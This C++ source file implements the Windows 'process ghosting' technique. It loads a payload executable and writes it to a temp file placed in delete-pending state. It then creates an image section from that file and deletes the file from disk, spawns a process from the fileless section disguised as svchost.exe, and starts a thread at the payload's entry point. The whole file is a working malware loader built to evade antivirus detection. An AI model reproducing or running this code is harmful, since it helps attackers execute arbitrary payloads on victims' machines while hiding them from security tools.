#include <stdio.h>
#include <Windows.h>
#include "CWLInc.h"
#include <iostream>

BYTE* GetPayloadBuffer(OUT size_t& p_size) {
	HANDLE hFile = CreateFileW(L"C:\\temp\\payload64.exe", GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE) {
		perror("[-] Unable to open payload file... \n");
		exit(-1);
	}
	p_size = GetFileSize(hFile, 0);
	BYTE* bufferAddress = (BYTE*)VirtualAlloc(0, p_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (bufferAddress == NULL) {
		perror("[-] Failed to allocated memory for payload buffer... \n");
		exit(-1);
	}
	DWORD bytesRead = 0;
	if (!ReadFile(hFile, bufferAddress, p_size, &bytesRead, NULL)) {
		perror("[-] Failed to read payload buffer... \n");
		exit(-1);
	}
	CloseHandle(hFile);
	return bufferAddress;
}

HANDLE MakeSectionFromDeletePendingFile(wchar_t* ntFilePath, BYTE* payload, size_t payloadSize) {
	HANDLE hFile;
	HANDLE hSection;
	NTSTATUS status;
	_OBJECT_ATTRIBUTES objAttr;
	UNICODE_STRING uFileName;
	IO_STATUS_BLOCK statusBlock = {0};
	DWORD bytesWritten;
	// NT Functions Declaration
	_NtOpenFile pNtOpenFile = (_NtOpenFile)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenFile");
	if (pNtOpenFile == NULL) {
		perror("[-] Unable To Found API NtOpenFile...\n");
		exit(-1);
	}
	_RtlInitUnicodeString pRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");
	if (pRtlInitUnicodeString == NULL) {
		perror("[-] Unable To Found API RtlInitUnicodeString...\n");
		exit(-1);
	}
	_NtSetInformationFile pNtSetInformationFile = (_NtSetInformationFile)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationFile");
	if (pNtSetInformationFile == NULL) {
		perror("[-] Unable To Found API NtSetInfromationFile...\n");
		exit(-1);
	}
	_NtCreateSection pNtCreateSection = (_NtCreateSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateSection");
	if (pNtCreateSection == NULL) {
		perror("[-] Unable To Found API NtCreateSection.. \n");
		exit(-1);
	}

	pRtlInitUnicodeString(&uFileName, ntFilePath);
	InitializeObjectAttributes(&objAttr, &uFileName, OBJ_CASE_INSENSITIVE, NULL, NULL);
	wprintf(L"[+] Opening The File...\n");
	// Open File 
	// FLAGS: 
	//		FILE_SUPERSEDED: deletes the old file and creates new one if file exists
	//		FILE_SYNCHRONOUS_IO_NONALERT: All operations on the file are performed synchronously

	status = pNtOpenFile(&hFile, GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE,
		&objAttr, &statusBlock, FILE_SHARE_READ | FILE_SHARE_WRITE,
		FILE_SUPERSEDED | FILE_SYNCHRONOUS_IO_NONALERT);
	if (!NT_SUCCESS(status)) {
		perror("[-] Error Opening File...\n");
		exit(-1);
	}


	wprintf(L"[+] Putting File Into Delete-Pending State...\n");
	// Set disposition flag 
	FILE_DISPOSITION_INFORMATION info = { 0 };
	info.DeleteFile = TRUE;
	// Set delete-pending state to the file
	// FileDispositionInformation: Request to delete the file when it is closed
	status = pNtSetInformationFile(hFile, &statusBlock, &info, sizeof(info), FileDispositionInformation);
	if (!NT_SUCCESS(status)) {
		perror("[-] Error setting file to delete pending state...\n");
		exit(-1);
	}


	wprintf(L"[+] Writing Payload Into Delete-Pending State File...\n");
	// Write Payload To File
	// Since we've set our file to delete-pending state
	// as soon as we close the handle the file will disappear
	if (!WriteFile(hFile, payload, payloadSize, &bytesWritten, NULL)) {
		perror("[-] Failed to write payload to the file...\n");
		exit(-1);
	}


	wprintf(L"[+] Creating Section From Delete-Pending State File...\n");
	// Before closing the handle we create a section from delete-pending file
	// This will later become the file-less section 
	// once we close the handle to the delete-pending file
	status = pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hFile);
	if (!NT_SUCCESS(status)) {
		perror("[-] Error setting file to delete pending state...\n");
		exit(-1);
	}
	wprintf(L"[+] Section Created From The Delete-Pending File...\n ");


	// Close the delete-pending file handle
	// This will remove the file from the disk
	CloseHandle(hFile);
	hFile = NULL;
	wprintf(L"[-] File Deleted Successfully...\n");
	return hSection;
	
}

HANDLE CreateProcessWithSection(HANDLE hSection) {
	HANDLE hProcess = INVALID_HANDLE_VALUE;
	NTSTATUS status;
	_NtCreateProcessEx pNtCreateProcessEx = (_NtCreateProcessEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateProcessEx");
	if (pNtCreateProcessEx == NULL) {
		perror("[-] Unable To Found API NtCreateProcessEx...\n");
		exit(-1);
	}
	// Create Process With File-less Section
	status = pNtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, 
					GetCurrentProcess(), PS_INHERIT_HANDLES, hSection, NULL, NULL, FALSE);
	if (!NT_SUCCESS(status)) {
		perror("[-] Unable To Create The Process...\n");
		exit(-1);
	}
	return hProcess;
}


ULONG_PTR GetEntryPoint(HANDLE hProcess, BYTE* payload, PROCESS_BASIC_INFORMATION pbi) {
	BYTE image[0x1000];
	ULONG_PTR entryPoint;
	SIZE_T bytesRead;
	NTSTATUS status;

	ZeroMemory(image, sizeof(image));
	// Function Declaration
	_RtlImageNTHeader pRtlImageNTheader = (_RtlImageNTHeader)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlImageNtHeader");
	if (pRtlImageNTheader == NULL) {
		perror("[-] Unable To Found API RtlImageNTheader...\n");
		exit(-1);
	}
	_NtReadVirtualMemory pNtReadVirtualMemory = (_NtReadVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtReadVirtualMemory");
	if (pNtReadVirtualMemory == NULL) {
		perror("[-] Unable To Found API NtReadVirtualMemory...\n");
		exit(-1);
	}
	status = pNtReadVirtualMemory(hProcess, pbi.PebBaseAddress, &image, sizeof(image), &bytesRead);
	if (!NT_SUCCESS(status)) {
		perror("[+] Unable to read remote process base address.. \n");
		exit(-1);
	}
	wprintf(L"[+] Base Address of target process PEB: %p \n", (ULONG_PTR)((PPEB)image)->ImageBaseAddress);
	entryPoint = (pRtlImageNTheader(payload)->OptionalHeader.AddressOfEntryPoint);
	entryPoint += (ULONG_PTR)((PPEB)image)->ImageBaseAddress;
	wprintf(L"[+] EntryPoint of the payload buffer: %p \n", entryPoint);
	return entryPoint;
}


BOOL ProcessGhosting(BYTE* payload, size_t payloadSize) {
	NTSTATUS status;
	_NtQueryInformationProcess pNtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
	if (pNtQueryInformationProcess == NULL) {
		perror("[-] Error NtQueryInformationProcess API not found\n");
		exit(-1);
	}

	_RtlInitUnicodeString pRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");
	if (pRtlInitUnicodeString == NULL) {
		perror("[-] Error RtlInitUnicodeString API not found\n");
		exit(-1);
	}

	_NtCreateThreadEx pNtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
	if (pNtCreateThreadEx == NULL) {
		perror("[-] Error NtCreateThreadEx API not found\n");
		exit(-1);
	}

	_NtWriteVirtualMemory pNtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
	if (pNtWriteVirtualMemory == NULL) {
		perror("[-] Error NtWriteVirtualMemory API not found\n");
		exit(-1);
	}

	_NtAllocateVirtualMemory pNtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
	if (pNtAllocateVirtualMemory == NULL) {
		perror("[-] Unable To Found API NtAllocateVirtualMemory...");
		exit(-1);
	}
	_RtlCreateProcessParametersEx pRtlCreateProcessParametersEx = (_RtlCreateProcessParametersEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlCreateProcessParametersEx");
	if (pRtlCreateProcessParametersEx == NULL) {
		perror("[-] Unable To Found API RtlCreateProcessParametersEx...");
		exit(-1);
	}
	HANDLE hProcess = INVALID_HANDLE_VALUE;
	HANDLE hSection = INVALID_HANDLE_VALUE;
	DWORD returnLength;
	PROCESS_BASIC_INFORMATION pbi;
	ULONG_PTR entryPoint;
	UNICODE_STRING uTargetFile;
	PRTL_USER_PROCESS_PARAMETERS processParameters;
	PEB* remotePEB;
	HANDLE hThread;
	UNICODE_STRING uDllPath;
	wchar_t ntPath[MAX_PATH] = L"\\??\\";
	wchar_t tempFileName[MAX_PATH] = {0};
	wchar_t tempPath[MAX_PATH] = {0};
	GetTempPathW(MAX_PATH, tempPath);
	GetTempFileNameW(tempPath, L"PG", 0, tempFileName);
	lstrcat(ntPath, tempFileName);
	hSection = MakeSectionFromDeletePendingFile(ntPath, payload, payloadSize);
	if (hSection == INVALID_HANDLE_VALUE) {
		perror("[-] Invalid Section...\n");
		exit(-1);
	}
	hProcess = CreateProcessWithSection(hSection);
	if (hProcess == INVALID_HANDLE_VALUE) {
		perror("[-] Invalid Process Handle...\n");
		exit(-1);
	}
	wprintf(L"[-] Successfully Created Process From File-less Section...\n");
	// Getting Process Infromation
	status = pNtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi , sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
	if (!NT_SUCCESS(status)) {
		perror("[-] Error Getting Process Infromation!!\n");
		exit(-1);
	}
	// Getting EntryPoint 
	entryPoint = GetEntryPoint(hProcess, payload, pbi);

	WCHAR targetPath[MAX_PATH];
	lstrcpyW(targetPath, L"C:\\windows\\system32\\svchost.exe");
	pRtlInitUnicodeString(&uTargetFile, targetPath);
	// Create and Fix parameters for newly created process
	// Create Process Parameters
	wchar_t dllDir[] = L"C:\\Windows\\System32";
	UNICODE_STRING uDllDir = { 0 };
	pRtlInitUnicodeString(&uDllPath, dllDir);
	status = pRtlCreateProcessParametersEx(&processParameters, &uTargetFile, &uDllPath, NULL,
		&uTargetFile, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
	if (!NT_SUCCESS(status)) {
		perror("[-] Unable To Create Process Parameters...\n");
		exit(-1);
	}

	// ALlocating memory for parameters in target process
	PVOID paramBuffer = processParameters;
	SIZE_T paramSize = processParameters->EnvironmentSize + processParameters->MaximumLength;
	status = pNtAllocateVirtualMemory(hProcess, &paramBuffer, 0, &paramSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!NT_SUCCESS(status)) {
		perror("[-] Unable To Allocate Memory For Process Parameters...\n");
		exit(-1);
	}
	printf("[+] Allocated Memory For Parameters %p\n", paramBuffer);
	// Writing Process Parameters in Target Process
	status = pNtWriteVirtualMemory(hProcess, processParameters, processParameters,
		processParameters->EnvironmentSize + processParameters->MaximumLength, NULL);
	remotePEB = (PEB*)pbi.PebBaseAddress;
	// Updating Process Parameters Address at remote PEB
	if (!WriteProcessMemory(hProcess, &remotePEB->ProcessParameters, &processParameters, sizeof(PVOID), NULL)) {
		perror("[-] Error Updating Process Parameters!!\n");
		exit(-1);
	}
	printf("[+] Updated Remote Process Parameters Address at PEB\n");

	// Create Thread
	status = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
		(LPTHREAD_START_ROUTINE)entryPoint, NULL, FALSE, 0, 0, 0, NULL);
	if (!NT_SUCCESS(status)) {
		std::cerr << "[-] Error Creating Thread: " << std::hex << status << std::endl;
		exit(-1);
	}
	printf("[+] Thread Executed...\n");


	return TRUE;
}

int main() {
	size_t payloadSize = 0;
	BYTE* payloadBuffer = GetPayloadBuffer(payloadSize);
	BOOL isSuccess = ProcessGhosting(payloadBuffer, payloadSize);
	system("pause");

}